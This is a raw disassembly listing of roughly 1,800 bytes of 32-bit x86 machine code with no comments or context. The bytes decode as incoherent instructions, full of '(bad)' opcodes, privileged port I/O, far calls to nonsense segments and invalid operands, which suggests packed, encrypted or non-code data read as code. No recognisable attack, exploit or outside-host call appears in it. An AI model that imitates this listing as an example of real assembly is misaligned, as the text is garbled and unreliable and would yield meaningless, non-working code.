  41c8d7:	jp     0x41c91b
  41c8d9:	out    0xb0,al
  41c8db:	xchg   ecx,eax
  41c8dc:	mov    bh,0x4c
  41c8de:	xor    al,BYTE PTR [ebx-0xcefb7a6]
  41c8e4:	sti    
  41c8e5:	and    eax,0x8b9a5ba2
  41c8ea:	lods   eax,DWORD PTR ds:[esi]
  41c8eb:	xor    eax,0x7fe4283f
  41c8f0:	mov    db1,esi
  41c8f3:	std    
  41c8f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8f5:	sbb    DWORD PTR [ebx],esp
  41c8f7:	call   0xe38f4d7d
  41c8fc:	enter  0x90e2,0x2d
  41c900:	sub    DWORD PTR [eax+0x57fdcd81],esp
  41c906:	scas   al,BYTE PTR es:[edi]
  41c907:	ja     0x41c8b1
  41c909:	xchg   edx,eax
  41c90a:	mov    al,ds:0xbeb8ec87
  41c90f:	cmp    BYTE PTR [edi+0x12],cl
  41c912:	out    dx,al
  41c913:	sub    eax,0xebdc9166
  41c918:	push   ss
  41c919:	imul   eax,DWORD PTR [edx-0x50c51a8d],0x2c106508
  41c923:	and    al,0x7e
  41c925:	xor    ah,BYTE PTR [eax+0x5]
  41c928:	sbb    esp,DWORD PTR [edi-0x4b]
  41c92b:	dec    edi
  41c92c:	into   
  41c92d:	lods   eax,DWORD PTR ds:[esi]
  41c92e:	pop    es
  41c92f:	push   es
  41c930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c931:	or     BYTE PTR [ebp-0x7b],bl
  41c934:	mov    dl,BYTE PTR [ecx-0xc]
  41c937:	pushf  
  41c938:	push   cs
  41c939:	fcom   DWORD PTR [ebx]
  41c93b:	mov    dl,0x88
  41c93d:	and    al,BYTE PTR [ecx+0x29]
  41c940:	out    dx,al
  41c941:	je     0x41c913
  41c943:	sbb    al,0xbf
  41c945:	fadd   DWORD PTR [ebp+0x75043ecb]
  41c94b:	bound  esi,QWORD PTR [eax]
  41c94d:	push   ss
  41c94e:	loopne 0x41c98b
  41c950:	test   eax,0x7b8286f0
  41c955:	adc    al,BYTE PTR [ebx+0x105d4135]
  41c95b:	out    0xc9,al
  41c95d:	in     al,dx
  41c95e:	xchg   esi,eax
  41c95f:	fiadd  WORD PTR [esp+eax*1+0x248917f9]
  41c966:	retf   
  41c967:	stos   DWORD PTR es:[edi],eax
  41c968:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c969:	xor    DWORD PTR [edi+0x6d],0xffffffcf
  41c96d:	ss mov ecx,0x97966d2e
  41c973:	pop    es
  41c974:	dec    ebp
  41c975:	fldcw  WORD PTR [edi+0x7c]
  41c978:	int    0x25
  41c97a:	vphaddwq xmm7,xmm1
  41c97f:	enter  0x8a3a,0x81
  41c983:	icebp  
  41c984:	push   esp
  41c985:	int3   
  41c986:	hlt    
  41c987:	pop    edx
  41c988:	mov    cl,0x7a
  41c98a:	push   0x3
  41c98c:	outs   dx,BYTE PTR ds:[esi]
  41c98d:	ret    
  41c98e:	mov    esi,0xa941f69c
  41c993:	aam    0x70
  41c995:	stos   DWORD PTR es:[edi],eax
  41c996:	fbld   TBYTE PTR [ecx+esi*1]
  41c999:	or     eax,0xae4ef00b
  41c99e:	sar    BYTE PTR [edx+0x1d2a02ff],1
  41c9a4:	jbe    0x41c9ba
  41c9a6:	mov    eax,ds:0xc325325c
  41c9ab:	jno    0x41c979
  41c9ad:	cmp    BYTE PTR [eax-0x128b859c],ah
  41c9b3:	sub    al,0xf5
  41c9b5:	outs   dx,DWORD PTR ds:[esi]
  41c9b6:	pop    es
  41c9b7:	pop    edi
  41c9b8:	fadd   st,st(3)
  41c9ba:	or     BYTE PTR [edi+0x12],al
  41c9bd:	and    eax,0x6cfd6cc
  41c9c2:	arpl   WORD PTR [ecx+0x1],di
  41c9c5:	das    
  41c9c6:	mov    ecx,0xc93b5f9e
  41c9cb:	jae    0x41ca4c
  41c9cd:	ins    DWORD PTR es:[edi],dx
  41c9ce:	inc    edi
  41c9cf:	(bad)  
  41c9d0:	loop   0x41c9d3
  41c9d2:	movd   DWORD PTR [ebx-0x3d],mm5
  41c9d6:	addr16 xor cl,dl
  41c9d9:	fst    QWORD PTR [ecx-0x7d]
  41c9dc:	mov    dl,0x78
  41c9de:	push   ds
  41c9df:	mov    dh,0x0
  41c9e1:	mov    eax,ds:0x3bd3b79f
  41c9e6:	mov    WORD PTR [ebp-0x6d],cs
  41c9e9:	dec    ebp
  41c9ea:	jl     0x41ca48
  41c9ec:	mov    esp,0x611a9547
  41c9f1:	mov    bl,0x82
  41c9f3:	out    dx,al
  41c9f4:	(bad)  
  41c9f5:	jo     0x41c99f
  41c9f7:	push   ss
  41c9f8:	inc    ecx
  41c9f9:	pop    esi
  41c9fa:	add    BYTE PTR [edi+ebp*2-0x5f13d293],ah
  41ca01:	out    0x35,eax
  41ca03:	inc    ecx
  41ca04:	int3   
  41ca05:	sub    eax,0x3979b2d0
  41ca0a:	xor    BYTE PTR [esi-0x12e19197],ch
  41ca10:	in     eax,dx
  41ca11:	xchg   esi,eax
  41ca12:	jp     0x41ca61
  41ca14:	pop    ecx
  41ca15:	push   ds
  41ca16:	sub    DWORD PTR [esi+eax*8+0x62],eax
  41ca1a:	pop    ecx
  41ca1b:	xor    BYTE PTR [esi-0x68],dl
  41ca1e:	(bad)  
  41ca1f:	mov    esi,DWORD PTR ds:0x531ac0ab
  41ca25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca26:	sbb    al,0x5f
  41ca28:	cdq    
  41ca29:	icebp  
  41ca2a:	cwde   
  41ca2b:	or     al,0xc
  41ca2d:	call   0x9537:0x3298279d
  41ca34:	mov    eax,ds:0xc9b6c14e
  41ca39:	mov    bl,BYTE PTR [eax]
  41ca3b:	xor    ah,BYTE PTR [eax-0x3dc907f]
  41ca41:	lock int 0x8d
  41ca44:	(bad)  
  41ca46:	lods   eax,DWORD PTR ds:[esi]
  41ca47:	push   0xffffff87
  41ca49:	dec    edi
  41ca4a:	outs   dx,BYTE PTR ds:[esi]
  41ca4b:	hlt    
  41ca4c:	cdq    
  41ca4d:	adc    eax,0xf1199b63
  41ca52:	cmc    
  41ca53:	scas   al,BYTE PTR es:[edi]
  41ca54:	data16 fld st(0)
  41ca57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca58:	arpl   sp,ax
  41ca5a:	retf   
  41ca5b:	call   0xc51064d6
  41ca60:	ja     0x41ca47
  41ca62:	push   0x208a18df
  41ca67:	adc    eax,0x6295ae3
  41ca6c:	test   al,0xe0
  41ca6e:	daa    
  41ca6f:	pop    edx
  41ca70:	stos   BYTE PTR es:[edi],al
  41ca71:	add    ch,BYTE PTR [edi-0x59eb6136]
  41ca77:	pop    ss
  41ca78:	nop
  41ca79:	inc    esi
  41ca7a:	loop   0x41ca57
  41ca7c:	adc    esi,esi
  41ca7e:	loopne 0x41ca70
  41ca80:	xchg   esp,eax
  41ca81:	(bad)
  41ca84:	loopne 0x41ca98
  41ca86:	ds mov cl,0x7b
  41ca89:	js     0x41cae4
  41ca8b:	dec    edx
  41ca8c:	and    eax,DWORD PTR [edx+0x59]
  41ca8f:	inc    esi
  41ca90:	pop    es
  41ca91:	inc    ebx
  41ca92:	pop    edi
  41ca93:	int3   
  41ca94:	sub    al,0x17
  41ca96:	and    BYTE PTR [edi],dh
  41ca98:	add    bl,BYTE PTR [eax-0x65]
  41ca9b:	push   edi
  41ca9c:	inc    eax
  41ca9d:	mov    ds:0xf7ed8e07,al
  41caa2:	ja     0x41ca26
  41caa4:	mov    eax,0x81602aa7
  41caa9:	popa   
  41caaa:	enter  0x3b19,0x1
  41caae:	xchg   esi,eax
  41caaf:	jae    0x41ca61
  41cab1:	xor    DWORD PTR [edx+0x58591b39],edi
  41cab7:	loope  0x41cb13
  41cab9:	jb     0x41cade
  41cabb:	mov    eax,0xad44c299
  41cac0:	jecxz  0x41cab4
  41cac2:	add    edi,DWORD PTR [ecx+0x10]
  41cac5:	and    dl,al
  41cac7:	sahf   
  41cac8:	pusha  
  41cac9:	sahf   
  41caca:	mov    edi,ebp
  41cacc:	and    cl,ch
  41cace:	outs   dx,BYTE PTR ds:[esi]
  41cacf:	sub    al,0x3c
  41cad1:	retf   0x3497
  41cad4:	dec    edi
  41cad5:	ret    0x3406
  41cad8:	aad    0x33
  41cada:	inc    esp
  41cadb:	test   eax,0xed8eee76
  41cae0:	inc    ecx
  41cae1:	push   ebp
  41cae2:	out    0x94,al
  41cae4:	push   ds
  41cae5:	sub    BYTE PTR [ebx+ebx*2+0x119caad4],dl
  41caec:	lods   eax,DWORD PTR ds:[esi]
  41caed:	jmp    0x5a41:0x8cf663a6
  41caf4:	hlt    
  41caf5:	xor    esi,DWORD PTR [edx]
  41caf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caf8:	fwait
  41caf9:	sub    bl,BYTE PTR [ebx]
  41cafb:	or     dl,BYTE PTR ds:0xedf45193
  41cb01:	sub    al,0x6
  41cb03:	mov    esp,DWORD PTR [esi-0x309a9b3a]
  41cb09:	adc    ah,BYTE PTR [ebx+ebp*4+0x46cb13f5]
  41cb10:	fldcw  WORD PTR [ebx-0xa]
  41cb13:	push   ds
  41cb14:	jno    0x41cb58
  41cb16:	sbb    DWORD PTR [esi-0x20],ecx
  41cb19:	xchg   BYTE PTR [ecx+0x724bbec5],dl
  41cb1f:	mov    bh,BYTE PTR [ebx]
  41cb21:	jl     0x41cb2a
  41cb23:	pop    eax
  41cb24:	das    
  41cb25:	test   bh,0x77
  41cb28:	mov    esi,DWORD PTR [ecx+0x2e75953c]
  41cb2e:	mov    cl,0x41
  41cb30:	retf   0x4cb
  41cb33:	es scas eax,DWORD PTR es:[edi]
  41cb35:	inc    esi
  41cb36:	dec    edi
  41cb37:	bound  esi,QWORD PTR [ebx-0x11]
  41cb3a:	xchg   edi,eax
  41cb3b:	add    eax,0x74adf926
  41cb40:	adc    eax,0xa6b938eb
  41cb45:	push   ebx
  41cb46:	nop
  41cb47:	sbb    DWORD PTR [esi],ecx
  41cb49:	scas   al,BYTE PTR es:[edi]
  41cb4a:	outs   dx,DWORD PTR ds:[esi]
  41cb4b:	nop
  41cb4c:	out    0x9a,al
  41cb4e:	inc    eax
  41cb4f:	inc    esi
  41cb50:	ds not dh
  41cb53:	in     eax,dx
  41cb54:	daa    
  41cb55:	pusha  
  41cb56:	adc    BYTE PTR [edx+0x12310400],dh
  41cb5c:	stos   BYTE PTR es:[edi],al
  41cb5d:	adc    al,0x18
  41cb5f:	mov    ?,WORD PTR [ebx]
  41cb61:	call   FWORD PTR [ebp-0x3b]
  41cb64:	shl    DWORD PTR [ebx],0xad
  41cb67:	or     ebp,DWORD PTR [ebp-0x316a93ab]
  41cb6d:	add    cl,BYTE PTR [eax]
  41cb6f:	js     0x41cb70
  41cb71:	in     al,dx
  41cb72:	mov    ebp,0x9e51e00b
  41cb77:	fstp   QWORD PTR es:[esi-0x50]
  41cb7b:	add    DWORD PTR [ecx+0x38a554f8],esi
  41cb81:	jns    0x41cb20
  41cb83:	xchg   ecx,eax
  41cb84:	mov    ah,0x7b
  41cb86:	in     al,dx
  41cb87:	jg     0x41cb8f
  41cb89:	push   edi
  41cb8a:	ins    BYTE PTR es:[edi],dx
  41cb8b:	adc    ch,ah
  41cb8d:	in     eax,0xbd
  41cb8f:	arpl   WORD PTR [edx+0x58],bx
  41cb92:	out    dx,eax
  41cb93:	(bad)  
  41cb94:	mov    bh,0xc6
  41cb96:	data16 outs dx,BYTE PTR ds:[esi]
  41cb98:	lea    edi,[ecx+0x62]
  41cb9b:	dec    DWORD PTR [edi]
  41cb9d:	sub    edi,DWORD PTR [ebx+ebp*2]
  41cba0:	xor    ah,bl
  41cba2:	int    0x2f
  41cba4:	call   0xb04e8cf2
  41cba9:	fwait
  41cbaa:	retf   
  41cbab:	mov    eax,0x6f6b2438
  41cbb0:	sub    BYTE PTR [esi-0x368150a6],0x21
  41cbb7:	aad    0xf9
  41cbb9:	push   ds
  41cbba:	adc    eax,DWORD PTR [edi+0x21]
  41cbbd:	test   BYTE PTR ds:0x9e7ef7ab,ah
  41cbc3:	iret   
  41cbc4:	adc    al,0xb7
  41cbc6:	jmp    0x41cb50
  41cbc8:	das    
  41cbc9:	cmovae eax,DWORD PTR [ecx+ebp*8+0x2e]
  41cbce:	nop
  41cbcf:	out    dx,eax
  41cbd0:	(bad)  
  41cbd1:	sbb    BYTE PTR [edi+edi*8],al
  41cbd4:	push   ebp
  41cbd5:	ror    DWORD PTR [eax+0x14ca374f],0x9
  41cbdc:	lock lahf 
  41cbde:	and    BYTE PTR [ecx+0x50],dh
  41cbe1:	jno    0x41cbb4
  41cbe3:	fst    DWORD PTR [ebp+0x4e553ead]
  41cbe9:	fst    QWORD PTR [ebx+ebp*2+0x65]
  41cbed:	xchg   esp,eax
  41cbee:	mov    ch,0xdf
  41cbf0:	bound  ebx,QWORD PTR [esi-0x1f]
  41cbf3:	jne    0x41cc26
  41cbf5:	test   BYTE PTR [ecx+0x69556c07],0xb2
  41cbfc:	pop    ecx
  41cbfd:	enter  0xc24f,0xe7
  41cc01:	frstor [ebx-0x4f]
  41cc04:	mov    dl,0xde
  41cc06:	xchg   edx,eax
  41cc07:	xor    DWORD PTR [esp+eax*2],edi
  41cc0a:	and    al,0xb1
  41cc0c:	pop    esp
  41cc0d:	push   es
  41cc0e:	imul   edi,edi,0x2e9877ac
  41cc14:	call   0x50cb9be0
  41cc19:	lods   al,BYTE PTR ds:[esi]
  41cc1a:	fs dec eax
  41cc1c:	sar    BYTE PTR [ebx+0x1b3d8766],0xea
  41cc23:	loope  0x41cc79
  41cc25:	and    DWORD PTR [ecx+0x7b],0xa
  41cc29:	cmp    esi,DWORD PTR [ecx]
  41cc2b:	arpl   WORD PTR [esi+edx*4+0x14],si
  41cc2f:	cmp    DWORD PTR [eax-0x72f2972d],ecx
  41cc35:	mov    ah,0x7f
  41cc37:	into   
  41cc38:	shl    BYTE PTR ds:0xed8d5db4,0x1d
  41cc3f:	fsubr  DWORD PTR [bp+0x29]
  41cc43:	arpl   WORD PTR [ebx-0x5338316d],ax
  41cc49:	ins    DWORD PTR es:[edi],dx
  41cc4a:	xchg   edx,eax
  41cc4b:	mov    dh,0xa4
  41cc4d:	mov    ds:0x6db41934,eax
  41cc52:	shl    DWORD PTR [edi+0x4d7507f6],0x4f
  41cc59:	mov    ds:0xa22fa990,al
  41cc5e:	mov    edx,edi
  41cc60:	mov    ax,0x4c05
  41cc64:	imul   esi,edi,0xffffff9b
  41cc67:	jnp    0x41cc4e
  41cc69:	std    
  41cc6a:	stc    
  41cc6b:	or     cl,dh
  41cc6d:	(bad)  
  41cc6e:	sub    eax,0x5db23ce7
  41cc73:	stos   DWORD PTR es:[edi],eax
  41cc74:	aad    0x50
  41cc76:	push   esi
  41cc77:	(bad)
  41cc7a:	mov    WORD PTR [ebx+0x50],cs
  41cc7d:	lds    ebp,FWORD PTR [eax-0x16]
  41cc80:	add    ebx,ebx
  41cc82:	cmp    al,0x93
  41cc84:	and    eax,DWORD PTR [edx+0x7c3ebb91]
  41cc8a:	scas   al,BYTE PTR es:[edi]
  41cc8b:	dec    ebp
  41cc8c:	lahf   
  41cc8d:	call   0x3eaa:0xe895da63
  41cc94:	(bad)  
  41cc95:	push   edx
  41cc96:	ficom  WORD PTR [edx-0x5b]
  41cc99:	pop    ebp
  41cc9a:	iret   
  41cc9b:	mov    ds:0x61d5c3fc,al
  41cca0:	push   0xffffff91
  41cca2:	call   0x123427d5
  41cca7:	sahf   
  41cca8:	mov    ds:0x71852852,al
  41ccad:	jle    0x41cc40
  41ccaf:	or     dh,BYTE PTR [edi-0x5e87bfe4]
  41ccb5:	xor    al,0xb7
  41ccb7:	ss add al,0xb9
  41ccba:	js     0x41cd2e
  41ccbc:	mov    ecx,0x74cffc18
  41ccc1:	sbb    al,0x75
  41ccc3:	cmp    eax,0x512e501f
  41ccc8:	xor    al,bh
  41ccca:	push   eax
  41cccb:	sub    BYTE PTR [ecx],bl
  41cccd:	and    edi,eax
  41cccf:	cwde   
  41ccd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccd1:	push   ebp
  41ccd2:	xlat   BYTE PTR ds:[ebx]
  41ccd3:	inc    ebx
  41ccd4:	mov    edi,0x59d045df
  41ccd9:	out    dx,eax
  41ccda:	and    eax,0x224a96c2
  41ccdf:	lahf   
  41cce0:	sahf   
  41cce1:	cwde   
  41cce2:	dec    ebp
  41cce3:	lock lods al,BYTE PTR fs:[esi]
  41cce6:	sbb    esi,DWORD PTR [edi+0x35]
  41cce9:	in     eax,0x3e
  41cceb:	mov    edx,0xcb206101
  41ccf0:	mov    BYTE PTR [esi],ah
  41ccf2:	in     eax,dx
  41ccf3:	add    BYTE PTR [esi+0x4f1fa953],dh
  41ccf9:	or     BYTE PTR [ecx+0x45d40ee9],ch
  41ccff:	mov    eax,ds:0x4fbc9515
  41cd04:	push   eax
  41cd05:	nop
  41cd06:	mov    ebp,0xf3f22dfb
  41cd0b:	(bad)  
  41cd0d:	sub    esi,DWORD PTR [esi]
  41cd0f:	in     eax,dx
  41cd10:	add    eax,0x9fb2dc97
  41cd15:	or     eax,0xf2d4e9b9
  41cd1a:	xchg   ebp,eax
  41cd1b:	xor    bl,BYTE PTR [edx-0x6a]
  41cd1e:	inc    esi
  41cd1f:	into   
  41cd20:	sbb    BYTE PTR [edi+ebp*4+0x1d688d8f],bh
  41cd27:	sbb    ebp,DWORD PTR ds:0xb5ff37a5
  41cd2d:	sub    cl,BYTE PTR [esi]
  41cd2f:	cmp    esp,DWORD PTR [edx-0x41]
  41cd32:	xor    esp,DWORD PTR [ecx]
  41cd34:	xlat   BYTE PTR ds:[ebx]
  41cd35:	into   
  41cd36:	sub    esi,DWORD PTR [edi-0x29]
  41cd39:	xchg   ebp,eax
  41cd3a:	xor    ebp,DWORD PTR [ebp-0x43]
  41cd3d:	push   ebx
  41cd3e:	cmp    ecx,0x15f44202
  41cd44:	scas   al,BYTE PTR es:[edi]
  41cd45:	enter  0xcc8d,0x94
  41cd49:	sub    al,BYTE PTR [ebx-0x2912f3e4]
  41cd4f:	rol    DWORD PTR [ecx-0x31],1
  41cd52:	aad    0xb4
  41cd54:	std    
  41cd55:	mov    edi,0x1acd898d
  41cd5a:	in     al,dx
  41cd5b:	outs   dx,BYTE PTR ds:[esi]
  41cd5c:	push   esp
  41cd5d:	cwde   
  41cd5e:	inc    esp
  41cd5f:	in     eax,0xe5
  41cd61:	xabort 0x30
  41cd64:	add    eax,0x41434d05
  41cd69:	jmp    0xff54f918
  41cd6e:	ret    0xe228
  41cd71:	xchg   DWORD PTR [edx+0x1],edx
  41cd74:	in     al,dx
  41cd75:	dec    ecx
  41cd76:	push   esi
  41cd77:	enter  0x4e7a,0x21
  41cd7b:	xor    edi,eax
  41cd7d:	jge    0x41cd41
  41cd7f:	test   BYTE PTR [eax+0x34742276],dh
  41cd85:	loopne 0x41cd79
  41cd87:	rcl    DWORD PTR [edi],cl
  41cd89:	push   cs
  41cd8a:	pop    ecx
  41cd8b:	xor    eax,0xae1613c5
  41cd90:	adc    eax,0x35d3b1db
  41cd95:	sbb    BYTE PTR [edi-0x71],cl
  41cd98:	adc    DWORD PTR [edx],ebp
  41cd9a:	test   eax,0x8e9eb7d6
  41cd9f:	mov    ah,0x7f
  41cda1:	ins    BYTE PTR es:[edi],dx
  41cda2:	bound  ecx,QWORD PTR [ecx]
  41cda4:	pop    edi
  41cda5:	int    0x8f
  41cda7:	cli    
  41cda8:	inc    eax
  41cda9:	(bad)  
  41cdab:	xchg   BYTE PTR [ecx-0x4ec36bce],bh
  41cdb1:	jle    0x41cd60
  41cdb3:	rol    ebp,cl
  41cdb5:	mov    eax,ds:0xa946f020
  41cdba:	sub    ah,BYTE PTR [edi+eax*8-0x4]
  41cdbe:	push   eax
  41cdbf:	push   ebp
  41cdc0:	ds inc esi
  41cdc2:	sbb    al,BYTE PTR [ecx-0x79]
  41cdc5:	xchg   ebx,eax
  41cdc6:	sbb    esi,DWORD PTR [eax+0x31fbb497]
  41cdcc:	loope  0x41cd9d
  41cdce:	ja     0x41cdc8
  41cdd0:	add    ah,BYTE PTR [edi+0x5196cb53]
  41cdd6:	ins    BYTE PTR es:[edi],dx
  41cdd7:	dec    eax
  41cdd8:	addr16 xor ecx,ebp
  41cddb:	fxam   
  41cddd:	push   edx
  41cdde:	cld    
  41cddf:	add    al,0x3e
  41cde1:	fcmovnu st,st(6)
  41cde3:	mov    ebx,0x351a5119
  41cde8:	add    BYTE PTR [edi],dl
  41cdea:	sahf   
  41cdeb:	loope  0x41cdc5
  41cded:	fcom   QWORD PTR [esi]
  41cdef:	push   0x8577a736
  41cdf4:	xor    ebp,edx
  41cdf6:	retf   
  41cdf7:	nop
  41cdf8:	pop    edi
  41cdf9:	mov    edi,DWORD PTR [esi]
  41cdfb:	sub    eax,0x14511156
  41ce00:	cld    
  41ce01:	out    0x24,al
  41ce03:	inc    ecx
  41ce04:	popa   
  41ce05:	xchg   edi,eax
  41ce06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce07:	add    eax,0xabdda5b3
  41ce0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce0d:	test   al,0xe7
  41ce0f:	dec    eax
  41ce10:	pop    ds
  41ce11:	pop    ebp
  41ce12:	out    0x3d,al
  41ce14:	adc    DWORD PTR [ebp+0x141204a9],ebp
  41ce1a:	std    
  41ce1b:	ror    DWORD PTR [ebx],1
  41ce1d:	lods   al,BYTE PTR ds:[esi]
  41ce1e:	shl    BYTE PTR [edi],1
  41ce20:	push   eax
  41ce21:	jnp    0x41ce45
  41ce23:	test   al,0x3a
  41ce25:	loope  0x41ce8c
  41ce27:	sbb    eax,0xf4af69e2
  41ce2c:	xchg   esi,eax
  41ce2d:	(bad)  
  41ce2e:	fdivrp st(7),st
  41ce30:	dec    ebp
  41ce31:	cmp    DWORD PTR [esi],ebx
  41ce33:	and    BYTE PTR [edi-0x6],dh
  41ce36:	xchg   ebx,eax
  41ce37:	das    
  41ce38:	sub    cl,al
  41ce3a:	cmp    ecx,DWORD PTR [ebp+0x48fef198]
  41ce40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce41:	rol    esp,0x20
  41ce44:	rol    DWORD PTR [ebp-0x5e],1
  41ce47:	lods   al,BYTE PTR ds:[esi]
  41ce48:	xchg   DWORD PTR [edx+0x4f3e079b],ecx
  41ce4e:	gs push ebx
  41ce50:	mov    eax,ds:0x79137ed7
  41ce55:	and    al,BYTE PTR [edx-0x36]
  41ce58:	xor    eax,0xc9b8998d
  41ce5d:	mov    al,ds:0xd52f631d
  41ce62:	pop    esp
  41ce63:	ins    DWORD PTR es:[edi],dx
  41ce64:	(bad)  
  41ce65:	and    BYTE PTR [esi+0x260a7e1d],dh
  41ce6b:	dec    esp
  41ce6c:	pop    ecx
  41ce6d:	dec    edi
  41ce6e:	dec    ecx
  41ce6f:	loopne 0x41ce1f
  41ce71:	(bad)
  41ce75:	and    al,0x42
  41ce77:	icebp  
  41ce78:	test   bl,0x95
  41ce7b:	(bad)  
  41ce7c:	into   
  41ce7d:	and    eax,0x55d0c3b0
  41ce82:	sti    
  41ce83:	je     0x41ce32
  41ce85:	xchg   edx,eax
  41ce86:	ja     0x41ce25
  41ce88:	loope  0x41ce60
  41ce8a:	into   
  41ce8b:	dec    esi
  41ce8c:	mov    ecx,DWORD PTR [esi+0x1955165b]
  41ce92:	popa   
  41ce93:	fild   WORD PTR [ebx-0x2a]
  41ce96:	xor    eax,0x814530d
  41ce9b:	sbb    BYTE PTR [eax+0x6f259fa4],0x3c
  41cea2:	adc    esi,DWORD PTR [edi-0x76]
  41cea5:	push   edi
  41cea6:	xchg   esp,eax
  41cea7:	rol    DWORD PTR [edi],cl
  41cea9:	jb     0x41ce7b
  41ceab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ceac:	stos   BYTE PTR es:[edi],al
  41cead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceae:	lds    eax,FWORD PTR [edi-0x65]
  41ceb1:	fxch   st(7)
  41ceb3:	repnz (bad) 
  41ceb5:	cmp    edi,DWORD PTR [esi+0x25be460c]
  41cebb:	fadd   DWORD PTR [edx]
  41cebd:	retf   0xed52
  41cec0:	sbb    bl,ch
  41cec2:	adc    bh,bl
  41cec4:	and    al,0x9c
  41cec6:	ins    DWORD PTR es:[edi],dx
  41cec7:	icebp  
  41cec8:	or     cl,BYTE PTR [edi-0x46]
  41cecb:	and    al,0xcb
  41cecd:	cmp    ah,ch
  41cecf:	sbb    eax,0xa20780af
  41ced4:	mov    ecx,0xab92b2ae
  41ced9:	jle    0x41cec5
  41cedb:	bnd jns 0x41ceb4
  41cede:	sbb    eax,ebp
  41cee0:	cli    
  41cee1:	mov    al,0xc7
  41cee3:	push   esi
  41cee4:	stc    
  41cee5:	jae    0x41cf1e
  41cee7:	repnz sahf 
  41cee9:	rcr    DWORD PTR [eax+0x2d676608],0x25
  41cef0:	scas   eax,DWORD PTR es:[edi]
  41cef1:	clc    
  41cef2:	repnz mov ecx,0x426d5660
  41cef8:	push   es
  41cef9:	add    ch,BYTE PTR [edx-0xae697d3]
  41ceff:	pop    ecx
  41cf00:	or     al,0x18
  41cf02:	jno    0x41cef5
  41cf04:	mov    ch,0x53
  41cf06:	sbb    esp,DWORD PTR [edi-0x8]
  41cf09:	pusha  
  41cf0a:	push   0xffffffb5
  41cf0c:	jecxz  0x41cf6d
  41cf0e:	xchg   ebx,eax
  41cf0f:	jmp    0x41cefd
  41cf11:	mov    dh,0x79
  41cf13:	scas   eax,DWORD PTR es:[edi]
  41cf14:	adc    DWORD PTR [eax+eax*1+0x220753de],edi
  41cf1b:	fimul  WORD PTR [eax+ebp*2+0x2a9f2718]
  41cf22:	pushf  
  41cf23:	mov    ds:0xc60b352c,eax
  41cf28:	out    dx,al
  41cf29:	into   
  41cf2a:	mov    eax,0x452805a8
  41cf2f:	frstor [esi]
  41cf31:	pop    ds
  41cf32:	(bad)  
  41cf33:	xchg   ah,ah
  41cf35:	pmulhw mm1,mm2
  41cf38:	pop    ecx
  41cf39:	cli    
  41cf3a:	outs   dx,DWORD PTR ds:[esi]
  41cf3b:	das    
  41cf3c:	push   edi
  41cf3d:	out    0xde,eax
  41cf3f:	stos   BYTE PTR es:[edi],al
  41cf40:	(bad)  
  41cf41:	aam    0x26
  41cf43:	imul   eax,DWORD PTR [edi],0xdef450aa
  41cf49:	xchg   edi,eax
  41cf4a:	xchg   ecx,eax
  41cf4b:	jecxz  0x41cf76
  41cf4d:	jnp    0x41cf1e
  41cf4f:	mov    cl,0xde
  41cf51:	adc    BYTE PTR [edi+0x59347820],ah
  41cf57:	stos   DWORD PTR es:[edi],eax
  41cf58:	cdq    
  41cf59:	xchg   ebp,eax
  41cf5a:	sbb    bh,BYTE PTR [edi]
  41cf5c:	leave  
  41cf5d:	jg     0x41cfa0
  41cf5f:	xchg   ecx,eax
  41cf60:	add    al,0x91
  41cf62:	pop    ds
  41cf63:	das    
  41cf64:	stos   DWORD PTR es:[edi],eax
  41cf65:	ror    BYTE PTR [eax-0x77f71d5f],0xba
  41cf6c:	jae    0x41cf0e
  41cf6e:	(bad)  
  41cf6f:	aam    0xb0
  41cf71:	stc    
  41cf72:	xchg   ebx,eax
  41cf73:	sub    al,0x4
  41cf75:	lods   eax,DWORD PTR ds:[esi]
  41cf76:	(bad)  
  41cf77:	adc    DWORD PTR [ebp-0x5f],esp
  41cf7a:	xor    DWORD PTR [esi],ebx
  41cf7c:	fwait
  41cf7d:	imul   esi,ecx,0xffffffa4
  41cf80:	lock and BYTE PTR [edi+0x4c],ah
  41cf84:	adc    eax,ebx
  41cf86:	cwde   
  41cf87:	add    BYTE PTR [edi],bl
  41cf89:	jnp    0x41cf9f
  41cf8b:	je     0x41cf82
  41cf8d:	test   DWORD PTR [edx+0x72],ebp
  41cf90:	xchg   ebx,eax
  41cf91:	dec    esi
  41cf92:	lods   al,BYTE PTR ds:[esi]
  41cf93:	jg     0x41cf64
  41cf95:	pop    edi
  41cf96:	stos   BYTE PTR es:[edi],al
  41cf97:	dec    edx
  41cf98:	out    0x25,eax
  41cf9a:	popf   
  41cf9b:	xchg   ebx,eax
  41cf9c:	repz loop 0x41cfee
  41cf9f:	ins    DWORD PTR es:[edi],dx
  41cfa0:	mov    esp,0xe8662b11
  41cfa5:	and    BYTE PTR [eax+0x14],0xc1
  41cfa9:	imul   eax,DWORD PTR [ebp+ebx*8+0x4f],0x9a6a9ef0
  41cfb1:	lods   eax,DWORD PTR gs:[esi]
  41cfb3:	jnp    0x41cf65
  41cfb5:	fwait
  41cfb6:	inc    ebp
  41cfb7:	xor    al,0x57
  41cfb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfba:	pop    ecx
  41cfbb:	or     DWORD PTR [eax],0x461080d
  41cfc1:	mov    ds:0x7d59aa49,eax
  41cfc6:	adc    eax,0xad41905e
  41cfcb:	in     al,0xe9
  41cfcd:	dec    edi
  41cfce:	inc    esi
  41cfcf:	rcl    DWORD PTR [esi],1
  41cfd1:	repnz xchg edx,eax
  41cfd3:	sbb    eax,0xd129e0c8
  41cfd8:	add    esp,DWORD PTR [ebx]
  41cfda:	stc    
  41cfdb:	daa    
  41cfdc:	test   ch,ch
  41cfde:	and    ah,BYTE PTR [edx+0x66]
  41cfe1:	cmp    ah,BYTE PTR [edi]
  41cfe3:	adc    BYTE PTR [esi+0x23],0x14
  41cfe7:	popa   
  41cfe8:	dec    esp
